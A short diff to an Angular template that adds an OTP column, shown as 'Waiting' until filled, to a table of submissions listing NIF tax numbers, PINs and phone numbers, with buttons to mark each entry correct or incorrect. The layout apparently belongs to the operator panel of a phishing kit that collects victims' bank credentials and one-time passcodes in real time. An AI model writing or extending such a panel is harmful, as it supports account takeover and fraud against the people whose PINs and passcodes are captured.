@@ -6,6 +6,7 @@
           <th>NIF</th>
           <th>PIN</th>
           <th>Phone Number</th>
+          <th>OTP</th>
           <th>Actions</th> <!-- New column for actions -->
         </tr>
       </thead>
@@ -14,6 +15,7 @@
           <td>{{ submission.nif }}</td>
           <td>{{ submission.pin }}</td>
           <td>{{ submission.phone }}</td>
+          <td>{{ submission.otp ? submission.otp : 'Waiting' }}</td>
           <td>
             <button (click)="markCorrect(submission)">Correct</button>
             <button (click)="markIncorrect(submission)">Incorrect</button>
